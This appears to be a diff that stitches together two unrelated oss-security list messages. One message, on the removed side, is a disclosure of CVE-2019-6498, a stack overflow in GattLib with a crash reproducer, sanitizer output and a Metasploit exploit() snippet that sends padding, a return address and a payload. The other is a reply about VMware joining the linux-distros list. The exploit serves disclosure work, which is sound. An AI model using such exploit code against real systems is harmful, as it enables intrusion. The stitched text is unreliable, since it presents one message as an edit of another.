@@ -1,161 +1,87 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/01/21/3
-Message-ID: <CAG8b5tT07LGjr=kPWGNa7fWTnGSDak5iTULw-9mC13AwvRHySg@mail.gmail.com>
-Date: Mon, 21 Jan 2019 11:31:33 +0400
-From: Dhiraj Mishra <mishra.dhiraj95@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: GattLib 0.2 has a stack-based buffer - CVE-2019-6498
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/11/04/2
+Message-ID: <373864a3-0558-3b34-b012-9d4cd8ccce23@csail.mit.edu>
+Date: Mon, 4 Nov 2019 15:03:42 -0800
+From: "Srivatsa S. Bhat" <srivatsa@...il.mit.edu>
+To: Solar Designer <solar@...nwall.com>, oss-security@...ts.openwall.com
+Cc: Steven Rostedt <rostedt@...dmis.org>, sashal@...nel.org, amakhalov@...are.com, anishs@...are.com, Sharath George <sharathg@...are.com>, mijzerman@...are.com, Srivatsa Bhat <srivatsab@...are.com>
+Subject: Re: Membership application for linux-distros - VMware
 Content-Type: text/plain; charset=utf-8
 
-Hi List,
 
-## Summary:
-While fuzzing gattlib (Gattlib is a library to access GATT information from
-BLE (Bluetooth Low Energy) devices) using clang 6.0 with ASAN a stack-based
-buffer-overflow was observed.
+Hi Alexander,
 
-## Vulnerable code from gattlib.c
+On 10/30/19 9:24 AM, Solar Designer wrote:
+> Hello Srivatsa,
+> 
+> I've reviewed your request and the external resources you referenced,
+> and more, and I find the request very reasonable and satisfying our
+> stated requirements.  I also gave others on oss-security time to comment
+> if they wanted to, and we've only seen comments in favor.
+> 
+> Please send me your PGP key off-list and I'll add you to linux-distros.
+> 
 
-// Transform string from 'DA:94:40:95:E0:87' to 'dev_DA_94_40_95_E0_87'
-strncpy(device_address_str, dst, sizeof(device_address_str));
-for (i = 0; i < strlen(device_address_str); i++) {
-if (device_address_str[i] == ':') {
-device_address_str[i] = '_';
-}
-}
+Thank you very much for adding VMware Photon OS to linux-distros!
 
-## Vulnerable code from discover.c
+> Please see below on contributing back:
+> 
+> On Wed, Oct 23, 2019 at 12:08:48PM -0700, Srivatsa S. Bhat wrote:
+>> We would like to volunteer for the following tasks (but we would love
+>> your suggestions on taking up other tasks instead, depending on the
+>> current needs of the list).
+>>
+>> Technical:
+>>
+>> 4. Check if related issues exist in the same piece of software (e.g.,
+>> same bug class common across the software, or other kinds of bugs
+>> exist in its problematic component), and inform the list either way -
+>> primary: Ubuntu, backup: vacant
+>>
+>> Administrative:
+>>
+>> 5. Determine if the reported issues are Linux-specific, and if so help
+>> ensure that (further) private discussion goes on the linux-distros
+>> sub-list only (thus, not spamming and unnecessarily disclosing to the
+>> non-Linux distros) - primary: SUSE, backup: vacant
+> 
+> This is a good choice, thanks!
+> 
+> I'd like you to pick a primary role for some task.  As an option, we can
+> make you primary for "5. Determine if the reported issues are
+> Linux-specific ...", moving SUSE to backup.
+> 
 
-if (argc != 2) {
-printf("%s <device_address>\n", argv[0]);
-return 1;
-}
+That sounds good to me!
 
-connection = gattlib_connect(NULL, argv[1], BDADDR_LE_PUBLIC, BT_SEC_LOW,
-0, 0);
-if (connection == NULL) {
-fprintf(stderr, "Fail to connect to the bluetooth device.\n");
-return 1;
-}
+> Please let me know of your final choice, as well as where you'd like to
+> be primary and where to join as a backup.
+> 
 
-Also, I have figured a simple way to reproduce this rather than using AFL
-poc in this case.
+I'd like to sign up as primary for Administrative 5: "Determine if the
+reported issues are Linux-specific... ", and as backup for Technical 4.
+"Check if related issues exist in the same piece of software...".
+(I did consider the other task that you brought up, namely Technical
+6, but I think we'd need more experience on the list before we can
+sign up for that task).
 
-./discover `python -c 'print "A"*20'`
+Also, is there a write-up somewhere that defines exactly what primary
+and backup means in this context? At the moment, I'm assuming that,
+for a given task, the primary distro will take up that task for every
+issue that gets posted onto linux-distros; and in case the primary is
+unavailable (due to vacation/travel etc), then the backup will step up
+for that task until the primary gets back. Is that how it works?  If
+so, will we get to know the contact details of other distros so that
+we can coordinate our schedules?
 
-## ASAN
+On a related note, would it be okay for me to request another member
+of the Photon OS team (whom I can vouch for), to be added to the
+linux-distros list, so that we can have at least one person from our
+team always available to take action for our distro, in response to
+the issues disclosed on the list?
 
-==31499==ERROR: AddressSanitizer: stack-buffer-overflow on address
-0x7ffc99cec2d4 at pc 0x00000044de04 bp 0x7ffc99cec270 sp 0x7ffc99ceba20
-READ of size 21 at 0x7ffc99cec2d4 thread T0
-    #0 0x44de03 in __interceptor_strlen.part.30
-(/home/zero/gattlib/build/examples/discover/discover+0x44de03)
-    #1 0x7f149e22069e in gattlib_connect
-/home/zero/gattlib/dbus/gattlib.c:224:18
-    #2 0x50bf48 in main
-/home/zero/gattlib/examples/discover/discover.c:43:15
-    #3 0x7f149c6d6b96 in __libc_start_main
-/build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310
-    #4 0x41c959 in _start
-(/home/zero/gattlib/build/examples/discover/discover+0x41c959)
+Thank you very much!
 
-Address 0x7ffc99cec2d4 is located in stack of thread T0 at offset 84 in
-frame
-    #0 0x7f149e22056f in gattlib_connect
-/home/zero/gattlib/dbus/gattlib.c:209
-
-  This frame has 3 object(s):
-    [32, 40) 'error'
-    [64, 84) 'device_address_str' <== Memory access at offset 84 overflows
-this variable
-    [128, 228) 'object_path'
-HINT: this may be a false positive if your program uses some custom stack
-unwind mechanism or swapcontext
-      (longjmp and C++ exceptions *are* supported)
-SUMMARY: AddressSanitizer: stack-buffer-overflow
-(/home/zero/gattlib/build/examples/discover/discover+0x44de03) in
-__interceptor_strlen.part.30
-Shadow bytes around the buggy address:
-  0x100013395800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x100013395810: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x100013395820: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x100013395830: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x100013395840: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-=>0x100013395850: f1 f1 f1 f1 00 f2 f2 f2 00 00[04]f2 f2 f2 f2 f2
-  0x100013395860: 00 00 00 00 00 00 00 00 00 00 00 00 04 f3 f3 f3
-  0x100013395870: f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00
-  0x100013395880: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1
-  0x100013395890: 00 f2 f2 f2 00 f2 f2 f2 04 f2 04 f2 00 00 00 00
-  0x1000133958a0: 06 f3 f3 f3 f3 f3 f3 f3 00 00 00 00 00 00 00 00
-Shadow byte legend (one shadow byte represents 8 application bytes):
-  Addressable:           00
-  Partially addressable: 01 02 03 04 05 06 07
-  Heap left redzone:       fa
-  Freed heap region:       fd
-  Stack left redzone:      f1
-  Stack mid redzone:       f2
-  Stack right redzone:     f3
-  Stack after return:      f5
-  Stack use after scope:   f8
-  Global redzone:          f9
-  Global init order:       f6
-  Poisoned by user:        f7
-  Container overflow:      fc
-  Array cookie:            ac
-  Intra object redzone:    bb
-  ASan internal:           fe
-  Left alloca redzone:     ca
-  Right alloca redzone:    cb
-==31499==ABORTING
-
-I have also written a quick MSF module for this specifically the exploit()
-part
-
-I have also written a quick MSF module for this specifically the exploit()
-part
-
-def exploit
-    connect
-
-    print_status("Sending #{payload.encoded.length} byte payload...")
-
-    # Building the buffer for transmission
-    buf = "A" * 20
-    buf += [ target.ret ].pack('V')
-    buf += payload.encoded
-
-    sock.put(buf)
-    sock.get
-
-    handler
-end
-
-In addition memory leak was also observed in this case.
-
-==31544==ERROR: LeakSanitizer: detected memory leaks
-
-Direct leak of 16 byte(s) in 1 object(s) allocated from:
-    #0 0x4d21b8 in calloc
-(/home/zero/gattlib/build/examples/discover/discover+0x4d21b8)
-    #1 0x7fe844ee2857 in gattlib_connect
-/home/zero/gattlib/dbus/gattlib.c:233:36
-    #2 0x50bf48 in main
-/home/zero/gattlib/examples/discover/discover.c:43:15
-    #3 0x7fe843398b96 in __libc_start_main
-/build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310
-
-SUMMARY: AddressSanitizer: 16 byte(s) leaked in 1 allocation(s).
-
-OR to verify memory leak use,
-
-./discover `python -c 'print "A"*10'`
-
-Later CVE-2019-6498 was assigned to this issue.
-
-Reference:
-https://github.com/labapart/gattlib/issues/81
-
-
-Thank you
-@mishradhiraj_
-
+Regards,
+Srivatsa
+VMware Photon OS
